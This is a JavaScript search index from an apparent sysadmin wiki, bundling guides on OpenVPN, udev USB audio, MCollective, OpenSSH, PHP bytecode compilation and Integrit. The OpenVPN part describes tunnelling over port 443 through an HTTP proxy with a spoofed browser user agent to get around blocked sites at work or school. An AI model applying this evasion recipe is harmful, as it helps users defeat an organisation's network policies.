via-file comp-lzo persist-key persist-tun status openvpn-status.log verb 3 Client linkThis configuration is used to have a fully automatic connection:\nclient dev tun proto tcp remote mufasa.deimos.fr 1194 resolv-retry infinite nobind tls-client persist-key persist-tun keepalive 10 120 ca /etc/openvpn/ca.crt cert /etc/openvpn/shenzi.crt key /etc/openvpn/shenzi.key tls-auth /etc/openvpn/ta.key 1 status /etc/openvpn/openvpn-status.log comp-lzo verb 3 auth-user-pass /etc/openvpn/auth.cfg auth-retry nointeract For your information, here are the options that need to be configured:\nkeepalive: enables automatic reconnection in case of loss auth-user-pass: allows you to store your credentials in a file auth-retry: allows for no interaction auth-nocache: this directive is deliberately not included. If you include it, the credentials will be dropped from memory after the first connection and at the first disconnection, no automatic reconnection will work. This usually results in a message like: “ERROR: could not read Auth username from stdin”. FAQ linkWARNING: No server certificate verification method has been enabled linkThis line is simply missing from your client configuration:\ntls-client Revoking a certificate linkIn case of compromise of one of the clients, it is important to know how to revoke its certificate to block access to the OpenVPN server. It is possible to block access to a client using easy-rsa (still positioning yourself in the easy-rsa directory):\n./revoke-full client2 Then you just need to copy the revocation list (keys/crl.pem) to the /etc/openvpn/server/ directory and specify to the OpenVPN server to check the revocation list by adding the line:\ncrl-verify /etc/openvpn/server1/crl.pem to the server configuration file (/etc/openvpn/server.conf).\nYou then need to restart the OpenVPN server.\nBypassing proxies linkYou may be at work or school where only ports 80 and 443 are open (bad). Additionally, some sites are blocked. To get around this, the server needs to use port 443 to establish the tunnel. Port 80 might not work due to certain restrictions (port 443 uses the CONNECT method due to SSL, while port 80 works in GET and POST mode). I specify that this is how it works if the proxy is correctly configured (and not in a “Swiss cheese” mode, otherwise it goes through on port 80 if the CONNECT mode is enabled).\nServer linkYou simply need to modify the connection type (replace UDP with TCP) and automatically change its default gateway with these 2 options:\n... proto tcp port 443 push \"redirect-gateway\" ... Then restart the server :-)\nClient linkHere we will define proxy rules and go through port 443:\n... remote fire.deimos.fr 443 # Enter here the proxy name or IP with its port http-proxy srv-proxy 3128 # Reinitialize connections through the proxy in case of loss or failure http-proxy-retry # Pretend to be a web client http-proxy-option AGENT Mozilla/5.0+(Windows;+U;+Windows+NT+5.0;+en-GB;+rv:1.7.6)+Gecko/20050226+Firefox/1.0.1 ... With all this, we’re good to go :-)\nFAQ linkAdvanced routing impossible linkIf like me you want to do a bit of complex routing on OpenVPN, you absolutely must change your TUN interfaces to TAP. Why? Simply because you’re on layer 3 with TUN and layer 2 with TAP.\nOn OpenBSD, you need to do it like this: ... dev tun0 dev-type tap ... On Linux: ... dev tap0 ... Making OpenVPN work in an OpenVZ VE linkIf you want to run an OpenVPN server in a VE, add these types of rights and create the necessary devices:\nvzctl set $my_veid --devices c:10:200:rw --save vzctl set $my_veid --capability net_admin:on --save vzctl exec $my_veid mkdir -p /dev/net vzctl exec $my_veid mknod /dev/net/tun c 10 200 vzctl exec $my_veid chmod 600 /dev/net/tun vzctl set $my_veid --devnodes net/tun:rw --save Resources linkOpenVPN Installation Documentation on a complex OpenVPN setup Hardware Authentication for OpenVPN http://blog.innerewut.de/2005/7/4/openvpn-2-0-on-openbsd http://www.openbsd-france.org/documentations/OpenBSD-openvpn.html http://www.procyonlabs.com/guides/openbsd/openvpn/index.php http://purple.monk.free.fr/phiva/?p=90 http://www.imped.net/oss/misc/openvpn-2.0-howto-edit.html http://auth-passwd.sourceforge.net/\n"
            }
        );
    index.add(
            {
                id:  234 ,
                href: "\/Swith_audio_output_to_another_USB_device\/",
                title: "Switch audio output to another USB device",
                description: "Instructions for setting up USB audio devices on Linux, including both manual and automatic approaches with udev rules",
                content: " Operating System Debian 7 Last Update 23/05/2013 Introduction linkI’ve recently bought an Enermax keyboard (Caesar) and have input and output audio directly on the keyboard! That’s great and better when it works. Unfortunately, as I have a minimal OS, it doesn’t work out of the box. So here is how I could achieve it.\nI will present 2 ways to make it work and I personally use the manual way.\nManual way linkFirst of all, you need to see if you could find your USB Audio device (normally there is no reason why you shouldn’t see it):\n\u003e lsusb [...] Bus 003 Device 004: ID 0d8c:0105 C-Media Electronics, Inc. CM108 Audio Controller [...] Then check this module is loaded:\n\u003e lsmod | grep snd_usb_audio snd_usb_audio 84836 2 If it’s not the case, add it to your module list and load it:\necho \"snd_usb_audio\" \u003e\u003e /etc/modules modprobe snd_usb_audio Now find the corresponding card ID (you could also have it in AlsaMixer):\n\u003e aplay -l [...] card 1: Device [USB Multimedia Audio Device], périphérique 0: USB Audio [USB Audio] Subdevices: 0/1 Subdevice #0: subdevice #0 [...] My card number is 1! Nice, now let’s add to our personal configuration (replace 1 at the end of the lines by your card number):\ndefaults.ctl.card 1 defaults.pcm.card 1 Now reboot to make it work!\nAutomatic way linkFor the automatic rules, we’re going to play with udev. Simply create a rule for it:\n# Set USB device as default sound card when plugged in KERNEL==\"pcmC[D0-9cp]*\", ACTION==\"add\", PROGRAM=\"/bin/sh -c 'K=%k; K=$${K#pcmC}; K=$${K%%D*}; echo defaults.ctl.card $$K \u003e /etc/asound.conf; echo defaults.pcm.card $$K \u003e\u003e/etc/asound.conf'\" # Restore default sound card when USB device unplugged KERNEL==\"pcmC[D0-9cp]*\", ACTION==\"remove\", PROGRAM=\"/bin/sh -c 'echo defaults.ctl.card 0 \u003e /etc/asound.conf; echo defaults.pcm.card 0 \u003e\u003e/etc/asound.conf'\" Udev will do the work to make it automatically work :-)\nReferences linkhttps://archlinux.me/w0ng/2012/07/06/alsa-switch-audio-usb-headset/\n"
            }
        );
    index.add(
            {
                id:  235 ,
                href: "\/MCollective:_lancez_des_actions_en_parall%C3%A8le_sur_des_machines_distante\/",
                title: "MCollective: Run Actions in Parallel on Remote Machines",
                description: "Learn how to use MCollective to manage and run commands in parallel across multiple remote machines using a middleware system rather than SSH.",
                content: " Software version 2.0.0 Operating System Debian 7 / RedHat 6.3 Website MCollective Website Last Update 14/05/2013 Introduction linkMcollective, short for “Marionette Collective”, is software written by R.I. Pienaar. The goal is to facilitate the management of numerous machines from a central point. It can be compared to tools like Fabric or Capistrano because it allows you to launch many actions in parallel on remote machines, but it differs on a notable point: it does not rely on SSH. Indeed, the program relies on middleware and provides features that make you not just any admin, but THE ultimate admin.\nWhy is this? Because a good part of the repetitive and tedious work is handled directly by the program. With the two software mentioned above, you need to know which machines are there and what configuration they carry. In short, you have to keep an up-to-date list. With Mcollective, client discovery is automatic: machines register themselves on a server, and during a request, messages are dispatched to all hosts via the middleware.\nMcollective uses a daemon that runs on each machine. The latter uses agents to perform the various actions expected of it: managing packages, services, or sending messages. Each agent subscribes to a “topic” of the middleware and waits for corresponding messages.\nI tried a half Debian 6, half Debian 7 installation to take advantage of ActiveMQ packages, but I don’t recommend it because there are a lot of dependency problems related to the Ruby and gems versions. That’s why I went with Debian 7.\nA web interface for MCollective administration has been created: MCOMaster.\nPrerequisites linkMcollective uses a queue server, so I’ll suggest two options:\nStomp server: designed for small installations ActiveMQ: a Java powerhouse, but necessary for large installations Use the one that interests you. Here’s how Mcollective is structured and should work:\nThe client actually corresponds to the machine that acts as the Mcollective server. It is the node that will control the Mcollective servers. The Mcollective servers are represented here by nodes in the form of clusters. For a machine to be controlled by the Mcollective client, the server must be installed on it. The middleware corresponds to the queue server (ActiveMQ for example). Middleware linkStomp server linkInstallation linkInstalling the Stomp server is easy:\naptitude install stompserver libstomp-ruby Configuration linkAnd its configuration is simple, modify the host with the IP address of the interface on which it should listen. Or all of them:\n--- :daemon: true :working_dir: /var/lib/stompserver :logdir: /var/log/stompserver :pidfile: /var/run/stompserver/pid :storage: /var/lib/stompserver/storage :etcdir: /etc/stompserver :queue: memory :auth: false :debug: false :group: stompserver :user: stompserver :host: 0.0.0.0 :port: 61613 ActiveMQ linkInstallation linkLet’s start installing ActiveMQ:\naptitude install activemq Configuration linkWe’ll configure ActiveMQ. I won’t explain all these lines, I simply took them from the PuppetLab site:\nfile:${activemq.conf}/credentials.properties This will create a ‘mcollective’ user with the password ‘marionette’ and give full access (read, write, and admin) to “/topic/mcollective.*”. Adapt the password according to your needs.\nWe’ll insert a file with the default credentials for ActiveMQ:\ncp /usr/share/doc/activemq/examples/conf/credentials.properties /etc/activemq/instances-available/main Next, we’ll add some options to avoid problems when booting ActiveMQ:\n# Time to wait for the server to start, in seconds STARTTIME=5 # !!! Use a specific data directory for each instance ACTIVEMQ_BASE=\"/var/lib/activemq/$INSTANCE\" # Use openjdk-6 as default Java runtime JAVA_HOME=\"/usr/lib/jvm/java-6-openjdk/\" # Set some JVM memory options ACTIVEMQ_OPTS=\"-Xms512M -Xmx512M -Dorg.apache.activemq.UseDedicatedTaskRunner=true\" # Arguments to launch /usr/bin/activemq ACTIVEMQ_ARGS=\"start xbean:activemq.xml\" # ActiveMQ configuration files ACTIVEMQ_CONF=\"/etc/activemq/instances-enabled/$INSTANCE\" Then we will enable this configuration and start ActiveMQ:\nln -s /etc/activemq/instances-available/main /etc/activemq/instances-enabled/main /etc/init.d/activemq start MCollective linkPrerequisites linkDebian linkTo install MCollective, we’re going to keep it simple and set up the Debian repository:\nwget http://apt.puppetlabs.com/puppetlabs-release-stable.deb dpkg -i puppetlabs-release-stable.deb And then, update:\naptitude update RedHat linkJust like with Debian, there is a yum repo on Red Hat, and we’ll install a package that will configure it for us:\nrpm -ivh http://yum.puppetlabs.com/el/6/products/x86_64/puppetlabs-release-6-6.noarch.rpm Server linkIn this section, we’ll see how to install and configure Mcollective on the server.\ninfo The server corresponds to the ‘client’ in the diagram. That is, the machine that will take control of all the Mcollective nodes. Installation linkInstall mcollective on Debian:\naptitude install mcollective mcollective-client You’ll be presented with a first option. If there’s Puppet on this machine, it will ask you to remove it; say no, and a second more flexible proposal will be offered. Accept this one.\nConfiguration linkLet’s configure the server part that will allow us to make queries to the server:\ntopicprefix = /topic/ main_collective = mcollective collectives = mcollective libdir = /usr/share/mcollective/plugins logger_type = console loglevel = warn # Plugins securityprovider = psk plugin.psk = unset connector = stomp plugin.stomp.host= localhost plugin.stomp.port= 61613 plugin.stomp.user= mcollective plugin.stomp.password= marionette # Facts factsource = yaml plugin.yaml = /etc/mcollective/facts.yaml Then configure the client part, even if it’s the server, this will allow us to perform actions on this machine as well:\n######################## # GLOCAL CONFIGURATION # ######################## topicprefix = /topic/ main_collective = mcollective collectives = mcollective libdir = /usr/share/mcollective/plugins logfile = /var/log/mcollective.log loglevel = info daemonize = 1 classesfile = /var/lib/puppet/classes.txt ########### # MODULES # ########### # Security securityprovider = psk plugin.psk = unset # Stomp connector = stomp plugin.stomp.host = mcollective.deimos.fr plugin.stomp.port = 61613 plugin.stomp.user = mcollective plugin.stomp.password = marionette # AgentPuppetd plugin.puppetd.puppetd = /usr/sbin/puppetd plugin.puppetd.lockfile = /var/lib/puppet/state/puppetdlock plugin.puppetd.statefile = /var/lib/puppet/state/state.yaml plugin.puppet.pidfile = /var/run/puppet/agent.pid plugin.puppetd.splaytime = 100 plugin.puppet.summary = /var/lib/puppet/state/last_run_summary.yaml ######### # FACTS # ######### factsource = facter plugin.yaml = /etc/mcollective/facts.yaml plugin.facter.facterlib = /var/lib/puppet/lib/facter fact_cache_time = 300 Now, restart mcollective:\n/etc/init.d/mcollective restart Client linkIn this section, we’ll see how to install and configure Mcollective on client machines.\nInstallation linkDebian linkInstall mcollective:\naptitude install mcollective RedHat linkInstall mcollective:\nyum install mcollective Configuration linkOn your clients, simply edit the configuration and put the correct values:\n######################## # GLOCAL CONFIGURATION # ######################## topicprefix = /topic/ main_collective = mcollective collectives = mcollective libdir = /usr/share/mcollective/plugins logfile = /var/log/mcollective.log loglevel = info daemonize = 1 classesfile = /var/lib/puppet/classes.txt ########### # MODULES # ########### # Security securityprovider = psk plugin.psk = unset # Stomp connector = stomp plugin.stomp.host = mcollective.deimos.fr plugin.stomp.port = 61613 plugin.stomp.user = mcollective plugin.stomp.password = marionette # AgentPuppetd plugin.puppetd.puppetd = /usr/sbin/puppetd plugin.puppetd.lockfile = /var/lib/puppet/state/puppetdlock plugin.puppetd.statefile = /var/lib/puppet/state/state.yaml plugin.puppet.pidfile = /var/run/puppet/agent.pid plugin.puppetd.splaytime = 100 plugin.puppet.summary = /var/lib/puppet/state/last_run_summary.yaml ######### # FACTS # ######### factsource = facter plugin.yaml = /etc/mcollective/facts.yaml plugin.facter.facterlib = /var/lib/puppet/lib/facter fact_cache_time = 300 Usage linkNow let’s move on to the interesting part… using it :-)\nDetecting Machines linkThere is a command to see which hosts are available:\n\u003e mco ping mcollective.deimos.fr time=45.62 ms server1 time=52.32 ms ---- ping statistics ---- 2 replies max: 52.32 min: 45.62 avg: 48.97 Getting Help linkTo get help and see installed modules:\n\u003e mco help The Marionette Collective version 2.0.0 controller Control the mcollective daemon facts Reports on usage for a specific fact filemgr Generic File Manager Client find Find hosts matching criteria help Application list and help inventory General reporting tool for nodes, collectives and subcollectives nrpe Client to the Nagios Remote Plugin Execution system package Install and uninstall software packages pgrep Distributed Process Management ping Ping all nodes plugin MCollective Plugin Application rpc Generic RPC agent client application service Start and stop system services Getting Statistics linkIt’s possible to retrieve statistics on your nodes this way:\n\u003e mco controller stats Determining the amount of hosts matching filter for 2 seconds .... 2 mcollective.deimos.fr\u003e total=14, replies=1, valid=14, invalid=0, filtered=12, passed=2 server1\u003e total=14, replies=13, valid=14, invalid=0, filtered=0, passed=14 Finished processing 2 / 2 hosts in 82.81 ms Inventorying a Node linkThe purpose of this command is to show us everything we have available on a mcollective node:\n\u003e mco inventory server1 Inventory for server1: Server Statistics: Version: 2.0.0 Start Time: 2012-08-02 16:00:33 +0200 Config File: /etc/mcollective/server.cfg Collectives: mcollective Main Collective: mcollective Process ID: 2746 Total Messages: 27 Messages Passed Filters: 26 Messages Filtered: 0 Expired Messages: 1 Replies Sent: 25 Total Processor Time: 0.7 seconds System Time: 0.49 seconds Agents: discovery filemgr nrpe package process rpcutil service shellcmd Configuration Management Classes: [...] openssh openssh::common openssh::redhat openssh::ssh_keys timezone timezone::redhat Facts: architecture =\u003e x86_64 [...] virtual =\u003e vmware Reloading All Nodes linkIf you have just deployed a new agent and want to reload Mcollective without restarting it, it’s possible to do it from the client:\nmco controller reload_agents If you want to do it on just one machine:\nmco controller reload_agents -W /machine/ Using RPC Commands linkIt is possible to use all modules in the form of an RPC command. Here is an example of syntax with the service module:\nmco rpc service start service=httpd Filters linkI’ll use examples from the official documentation because they are very explicit:\n# all machines with the service agent mco ping -A service mco ping --with-agent service # all machines with the apache class on them mco ping -C apache mco ping --with-class apache # all machines with a class that match the regular expression mco ping -C /service/ # all machines in the UK mco ping -F country=uk mco ping --with-fact country=uk # all machines in either UK or USA mco ping -F \"country=/uk|us/\" # just the machines called dev1 or dev2 mco ping -I dev1 -I dev2 # all machines in the domain foo.com mco ping -I /foo.com$/ # all machines with classes matching /apache/ in the UK mco ping -W \"/apache/ location=uk\" For even more advanced filters, I recommend the official documentation. Here’s an example of a somewhat complex search:\nmco service restart httpd -S \"((customer=acme and environment=staging) or environment=development) and /apache/\" Modules linkModules allow you to add functionality to Mcollective. For example, the management of services, packages, nrpe plugins…\nWe’ll see here how to install some of them. To make this article simple and compatible with RedHat/Debian, we’ll use variables for plugin installation and create some missing folders:\n# Red Hat test -d /usr/libexec/mcollective/mcollective \u0026\u0026 mco_plugins=/usr/libexec/mcollective/mcollective # Debian test -d /usr/share/mcollective/plugins/mcollective \u0026\u0026 mco_plugins=/usr/share/mcollective/plugins/mcollective mkdir -p $mco_plugins/{aggregate,specs} Services linkThe Service module allows you to use service management: stop, start, restart, enable, disable and status. We’ll need to install one part on the servers and another part on the client.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agent wget -O service.rb \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/service/agent/puppet-service.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/service/agent/service.ddl\" wget -O service.rb \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/service/agent/puppet-service.rb\" cd $mco_plugins/application wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/service/application/service.rb\" Restart Mcollective.\nUsage linkFor usage it’s simple, just look at my request for the ssh service:\n\u003e mco service ssh status Do you really want to operate on services unfiltered? (y/n): y * [ ============================================================\u003e ] 1 / 1 server1 status=running ---- service summary ---- Nodes: 1 / 1 Statuses: started=1 Elapsed Time: 0.12 s File Manager Agent linkThe “File Manager Agent” module allows you to create empty files, delete them or retrieve information about files.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/filemgr/agent/filemgr.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/filemgr/agent/filemgr.ddl\" \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/filemgr/agent/filemgr.rb\" cd $mco_plugins/application wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/filemgr/application/filemgr.rb\" Restart Mcollective.\nUsage linkFor usage it’s simple, here’s how to get stats on a file:\n\u003e mco rpc filemgr status file=/etc/puppet/puppet.conf Determining the amount of hosts matching filter for 2 seconds .... 1 * [ ============================================================\u003e ] 1 / 1 server1 Change time: 2012-07-30 15:20:22 +0200 Present: 1 Type: file Owner: 0 Modification time: 1343654422 Status: present Group: 0 Change time: 1343654422 Access time: 1343828479 Access time: 2012-08-01 15:41:19 +0200 Size: 1077 MD5: 9b0758440c57ee13abd7e120cab57e84 Name: /etc/puppet/puppet.conf Modification time: 2012-07-30 15:20:22 +0200 Mode: 100644 Finished processing 1 / 1 hosts in 65.48 ms NRPE linkThe “NRPE” module allows you to use NRPE checks defined in your nagios configurations.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/agent/nrpe.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/agent/nrpe.ddl\" \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/agent/nrpe.rb\" cd $mco_plugins/application wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/application/nrpe.rb\" cd $mco_plugins/aggregate wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/aggregate/nagios_states.rb\" cd /usr/sbin/ wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/nrpe/sbin/check-mc-nrpe\" Restart Mcollective.\nUsage linkFor usage it’s simple, here’s how to get stats on a file:\nmco nrpe -W /dev_server/ check_load Package Agent linkThe “Package Agent” module allows you to install packages or find out if a package is installed or not.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/agent/puppet-package.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/agent/puppet-package.rb\" \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/agent/package.ddl\" cd $mco_plugins/application wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/application/package.rb\" cd $mco_plugins/specs wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/spec/package_agent_spec.rb\" \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/package/spec/package_application_spec.rb\" Restart Mcollective.\nUsage linkHere’s an example of usage:\n\u003e mco package status postfix Do you really want to operate on packages unfiltered? (y/n): y * [ ============================================================\u003e ] 1 / 1 server1 version = postfix-2.6.6-2.2.el6_1 ---- package agent summary ---- Nodes: 1 / 1 Versions: 1 * 2.6.6-2.2.el6_1 Elapsed Time: 0.11 s FactsFacter linkThe “FactsFacter” module allows you to use the facts you have in your Puppet.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/facts wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/facts/facter/facter_facts.rb\" You also need to modify the configuration with the facts information. Add or adapt these lines:\n[...] # Facts factsource = facter plugin.yaml = /etc/mcollective/facts.yaml plugin.facter.facterlib = /usr/lib/ruby/site_ruby/1.8/facter:/usr/lib/ruby/site_ruby/1.8/facter/util:/var/lib/puppet/lib/facter fact_cache_time = 300 Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/facts wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/facts/facter/facter_facts.rb\" Restart Mcollective.\nUsage linkHere’s an example of usage:\n\u003e mco find -W operatingsystem=RedHat server1 Process Management Agent linkThe “Agent Process” module allows you to list processes on your machines.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/process/agent/process.rb\" You will also need a ruby sys-proctable library.\nRestart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agent wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/process/agent/process.rb\" \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/process/agent/process.ddl\" cd $mco_plugins/application wget \"https://raw.github.com/puppetlabs/mcollective-plugins/master/agent/process/application/pgrep.rb\" Restart Mcollective.\nUsage linkHere’s an example of usage:\n\u003e mco pgrep postfix * [ ============================================================\u003e ] 1 / 1 server1 PID USER VSZ COMMAND 1519 root 75.395 MB /usr/libexec/postfix/master ---- process list stats ---- Matched hosts: 1 Matched processes: 1 Resident Size: 788.000 KB Virtual Size: 75.395 MB Finished processing 1 / 1 hosts in 294.55 ms Agent Puppetd linkThe “Agent Puppet” module allows you to control the puppetd daemon and launch puppet client runs. The problem with this one is that it’s not up to date, doesn’t support tags and the noop option. Fortunately, some people have looked into it, so we’ll install this version while waiting for the official version to come out.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agents wget \"https://gist.github.com/raw/2983382/3cd8ca0764d0f1ab4411a2da3fd8a75262ce2ad9/puppetd.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agents wget \"https://gist.github.com/raw/2983382/3cd8ca0764d0f1ab4411a2da3fd8a75262ce2ad9/puppetd.rb\" \"https://gist.github.com/raw/2983382/f07e0d95378d1d46bd479ba9a734349432ecac0f/puppetd.ddl\" cd $mco_plugins/application wget -O puppetd.rb \"https://gist.github.com/raw/2983382/5a95d65d1c027444abcfb4fbe0e5f85d772acdf9/puppetd_application.rb\" Restart Mcollective.\nUsage linkHere’s an example of usage:\n\u003e mco puppetd -W /server1/ -f --tags mcollective --noop runonce 2012-08-08 10:38:37 +0200\u003e Running with custom tags given: mcollective * [ ============================================================\u003e ] 1 / 1 Finished processing 1 / 1 hosts in 1023.46 ms -f: allows forcing synchronization immediately instead of waiting for a random time interval –tags: allows defining a particular tag to synchronize –noop: allows simulation If we want to run it on multiple machines in parallel (2 simultaneously):\n\u003e mco puppetd runall 2 Shell linkThe “Shell” module allows you to run any shell command on all your machines.\nServer linkOn all server nodes, add this:\ncd $mco_plugins/agents wget \"https://raw.github.com/phobos182/mcollective-plugins/master/agent/shell/shell.rb\" Restart Mcollective.\nClient linkOn the client:\ncd $mco_plugins/agents wget \"https://raw.github.com/phobos182/mcollective-plugins/master/agent/shell/shell.rb\" \"https://raw.github.com/phobos182/mcollective-plugins/master/agent/shell/shell.ddl\" cd $mco_plugins/application wget \"https://raw.github.com/phobos182/mcollective-plugins/master/agent/shell/application/shell.rb\" Restart Mcollective.\nUsage linkHere’s an example of usage:\n\u003e mco shell '/etc/init.d/postfix restart' Do you really want to send this command unfiltered? (y/n): y Determining the amount of hosts matching filter for 2 seconds .... 1 * [ ============================================================\u003e ] 1 / 1 [ch-bmf-srv-poc-5] exit=0: Shutting down postfix: [ OK ] Starting postfix: [ OK ] ... FAQ linkDebugging ActiveMQ linkSometimes we may have problems when setting up ActiveMQ. To get more information on the return, here’s how to manually start ActiveMQ:\n/usr/bin/activemq console xbean:/etc/activemq/instances-enabled/main/activemq.xml Caught TERM; calling stop linkIf you encounter this type of error message in Puppet Dashboard when launching Puppet runs from Mcollective, you need to work on the puppet manifest, to comment this line:\n[...] service { 'puppet-srv' : name =\u003e 'puppet', # Let this line commented if you're using Puppet Dashboard #ensure =\u003e stopped, enable =\u003e false } [...] `load’: no such file to load linkIf you have this kind of message when starting MCollective:\n/usr/lib/ruby/1.8/mcollective/pluginmanager.rb:169:in `load': no such file to load -- mcollective/facts/facter_facts.rb (LoadError) from /usr/lib/ruby/1.8/mcollective/pluginmanager.rb:169:in `loadclass' from /usr/lib/ruby/1.8/mcollective/config.rb:137:in `loadconfig' from /usr/sbin/mcollectived:29 It’s because the path of the libraries is wrong1. Fix this in the MCollective server configuration file:\n[...] # libdir = /usr/libexec/mcollective libdir = /usr/share/mcollective/plugins [...] References linkhttp://www.unixgarden.com/index.php/gnu-linux-magazine/mcollective-l-administration-systeme-massive http://docs.puppetlabs.com/mcollective\nhttps://groups.google.com/forum/?fromgroups=#!topic/mcollective-users/bJJ2jbx8Pco ↩︎\n"
            }
        );
    index.add(
            {
                id:  236 ,
                href: "\/FAQ_OpenSSH\/",
                title: "OpenSSH FAQ",
                description: "Frequently Asked Questions about OpenSSH. Solutions to common problems and configuration tips.",
                content: "Introduction linkOpenSSH is not always simple, which is why a small documentation is useful.\nFAQ linkfatal: Timeout before authentication for @ip linkYour DNS on your SSH server might not be up to date. Check them.\nSome clients take a long time to connect linkOn the SSH server, it is very likely that the server is trying to resolve names, which is not always possible or practical. The solution is to disable this (/etc/ssh/sshd_config):\n... UseDNS no ... You just need to restart the SSH server.\nUnspecified GSS failure. Minor code may provide more information linkAdd this line to your configuration (/etc/ssh/sshd_config):\nGSSAPIAuthentication no Limit users authorized in SSH link [...] AllowUsers deimos [...] "
            }
        );
    index.add(
            {
                id:  237 ,
                href: "\/Compiler_vos_scripts_PHP\/",
                title: "Compile Your PHP Scripts",
                description: "How to compile PHP scripts for both protection and performance improvements",
                content: " Software version 5.3 Operating System Debian 6 Website PHP Website Last Update 08/05/2013 Introduction linkSooner or later, we all face issues related to protecting the fruit of our intellectual labor. Here’s a way to protect your precious PHP code and improve the execution time of your PHP scripts.\nInstallation linkThe compiler is only provided in a development environment, which requires some installation steps before use:\naptitude update aptitude upgrade aptitude install make aptitude install php5-dev pecl install bcompiler Then we’ll modify the php.ini file. We need to add extension=bcompiler.so to the end of your php.ini file:\ncp /etc/php5/apache2/php.ini /etc/php5/apache2/php.ini.old echo \"extension=bcompiler.so\" \u003e\u003e /etc/php5/apache2/php.ini Configuration link \u003e php --php-ini /etc/php5/apache2/php.ini -r \"bcompiler_write_header();\" OK : PHP Warning: bcompiler_write_header() expects at least 1 parameter, 0 given in Command line code on line 1 KO : PHP Fatal error: Call to undefined function bcompiler_write_header() in Command line code on line 1 If you get a KO, you need to redo the procedure and make sure that pear-php is properly installed.\nCompiling PHP Code linkCreate a source file:\n\u003c?php echo \"it codes and decodes\"; ?\u003e Then create a file called compiler.php:\n\u003c?php // the path of the bytecode file that will be created later $bytecode = \"bytecode.php\"; // The source file $codesource = \"code.php\"; // creation of the compiled file $fichierbytecode = fopen($bytecode, \"w\"); // writing the file header; bcompiler_write_header($fichierbytecode); // writing the body of the file: bcompiler_write_file($fichierbytecode, $codesource); // writing the footer of the file: bcompiler_write_footer($fichierbytecode); ?\u003e Run the PHP interpreter in CLI:\nphp --php-ini /etc/php5/apache2/php.ini compiler.php Replace the links on your html index.php page from “code.php” to the bytecode.php file. The result doesn’t change, but the recipe is unknown :-)\nReferences linkPHP Bcompiler documentation\n"
            }
        );
    index.add(
            {
                id:  238 ,
                href: "\/Integrit_:_Add_an_integrity_control_tool_on_your_Debian\/",
                title: "Integrit: Add an integrity control tool on your Debian",
                description: "How to install and configure Integrit, a simple yet secure alternative to tripwire for file integrity monitoring on Debian systems.",
                content: " Software version 4.1 Operating System Debian 7 Website Integrit Website Last Update 07/05/2013 Introduction linkIntegrit1 is a simple yet secure alternative to products like tripwire. It has a small memory footprint, uses up-to-date cryptographic algorithms, and has features that make sense (like including the MD5 checksum of newly generated databases in the report\nInstallation linkTo install Integrit:\naptitude install integrit Configuration link # /etc/integrit/integrit.debian.conf # Configuration of the example daily cron job /etc/cron.daily/integrit # Set the configuration file(s) for integrit. /etc/cron.daily/integrit # will run ``integrit -uc -C '' for each file specified in CONFIGS. # An empty CONFIGS variable disables /etc/cron.daily/integrit. Multiple # file names are separated with spaces, e.g.: # CONFIGS=\"/etc/integrit/usr.conf /etc/integrit/lib.conf\" # CONFIGS=\"/etc/integrit/integrit.conf\" CONFIGS=\"/etc/integrit/integrit.conf\" # Set the mail address reports are sent to EMAIL_RCPT=\"xxx@mycompany.com\" # Set the subject line for the report mails EMAIL_SUBJ=\"[integrit] `hostname -f`: report on changes in the filesystems\" # If ALWAYS_EMAIL is set to ``true'', a report is mailed on every run. # Normally a report is only generated when integrit(1) exits non-zero. ALWAYS_EMAIL=false You need to adapt the vars vars listed bellow:\nCONFIGS: set your main configuration or multiples if you have so EMAIL_RCPT: your email address (the recipient) EMAIL_SUBJ: the email subject if this one doesn’t suit you ALWAYS_EMAIL: set it to false if you want to receive emails only when a change occur Now we’re going to edit the main configuration of Integrit:\n# /etc/integrit/integrit.conf # /etc/integrit.conf : configuration file for integrit # # See integrit(1) and /usr/share/doc/integrit/examples/ # for more information. # # *** WARNING *** # # This is a simple default configuration file for Debian systems. # It contains only comments, therefore integrit will not run with # it. To make integrit functional, you must edit this file according # to your needs. # # Please read README.Debian before running integrit. # # *** WARNING *** # root=/ known=/var/lib/integrit/known.cdb current=/var/lib/integrit/current.cdb # # # Here's a table of letters and the corresponding checks / options: # # Uppercase turns the check off, lowercase turns it on. # # # # s\tchecksum # # 